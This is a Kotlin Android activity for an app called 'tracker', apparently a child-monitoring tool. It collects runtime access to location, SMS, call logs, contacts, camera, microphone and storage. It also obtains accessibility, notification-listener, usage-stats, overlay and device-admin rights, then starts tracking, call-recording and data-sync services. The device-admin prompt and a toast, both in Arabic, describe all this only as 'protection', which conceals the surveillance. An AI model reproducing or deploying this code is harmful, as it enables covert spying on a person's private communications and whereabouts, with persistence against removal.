package com.abuzahra.tracker

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.text.TextUtils
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.abuzahra.tracker.receivers.MyDeviceAdminReceiver
import com.abuzahra.tracker.services.CallRecorderService
import com.abuzahra.tracker.services.DataSyncWorker
import com.abuzahra.tracker.services.MainTrackerService

class MainActivity : AppCompatActivity() {

    lateinit var webView: WebView
    private val PERMISSIONS_REQUEST_CODE = 101
    private var isSetupComplete = false

    private val runtimePermissions = arrayOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_EXTERNAL_STORAGE
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        webView = findViewById(R.id.webview)
        setupWebView()
        checkAndRequestPermissions()
    }

    private fun setupWebView() {
        val webSettings: WebSettings = webView.settings
        webSettings.javaScriptEnabled = true
        webSettings.domStorageEnabled = true
        webView.addJavascriptInterface(ChildWebInterface(this), "AndroidNative")
        webView.webViewClient = WebViewClient()
        webView.loadUrl("file:///android_asset/child_index.html")
    }
    
    private fun checkAndRequestPermissions() {
        val missingPermissions = runtimePermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()

        if (missingPermissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missingPermissions, PERMISSIONS_REQUEST_CODE)
        } else {
            validateSpecialPermissions()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSIONS_REQUEST_CODE) {
            validateSpecialPermissions()
        }
    }
    
    private fun validateSpecialPermissions() {
        if (!isIgnoringBatteryOptimizations()) { requestIgnoreBatteryOptimizations(); return }
        if (!Settings.canDrawOverlays(this)) { startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))); return }
        if (!hasUsageStatsPermission()) { startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)); return }
        if (!isNotificationServiceEnabled()) { startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")); return }
        if (!isAccessibilityServiceEnabled()) { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)); return }

        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val compName = ComponentName(this, MyDeviceAdminReceiver::class.java)
        if (!dpm.isAdminActive(compName)) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, compName)
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "مطلوب لحماية التطبيق")
            startActivity(intent); return
        }

        onAllPermissionsGranted()
    }

    private fun onAllPermissionsGranted() {
        if (!isSetupComplete) {
            isSetupComplete = true
            startAllServices()
            Toast.makeText(this, "تم تفعيل الحماية الكاملة", Toast.LENGTH_SHORT).show()
            webView.post { webView.evaluateJavascript("window.onSetupComplete()", null) }
        }
    }

    private fun startAllServices() {
        val trackerIntent = Intent(this, MainTrackerService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(trackerIntent) else startService(trackerIntent)

        val callIntent = Intent(this, CallRecorderService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(callIntent) else startService(callIntent)

        DataSyncWorker.startImmediate(this)
    }

    private fun isIgnoringBatteryOptimizations(): Boolean {
        val pwrm = getSystemService(Context.POWER_SERVICE) as PowerManager
        return pwrm.isIgnoringBatteryOptimizations(packageName)
    }

    private fun requestIgnoreBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.data = Uri.parse("package:$packageName")
            startActivity(intent)
        }
    }

    private fun hasUsageStatsPermission(): Boolean {
        try {
            val appOps = getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
            val mode = appOps.checkOpNoThrow(android.app.AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
            return mode == android.app.AppOpsManager.MODE_ALLOWED
        } catch (e: Exception) { return false }
    }

    private fun isNotificationServiceEnabled(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat != null && flat.contains(packageName)
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        var accessibilityEnabled = 0
        try { accessibilityEnabled = Settings.Secure.getInt(contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED) } catch (e: Exception) {}
        if (accessibilityEnabled == 1) {
            val settingValue = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
            if (settingValue != null) {
                val splitter = TextUtils.SimpleStringSplitter(':')
                splitter.setString(settingValue)
                while (splitter.hasNext()) {
                    if (splitter.next().equals("${packageName}/com.abuzahra.tracker.services.MyAccessibilityService", ignoreCase = true)) {
                        return true
                    }
                }
            }
        }
        return false
    }
    
    fun startWorker() { DataSyncWorker.startImmediate(this) }
}
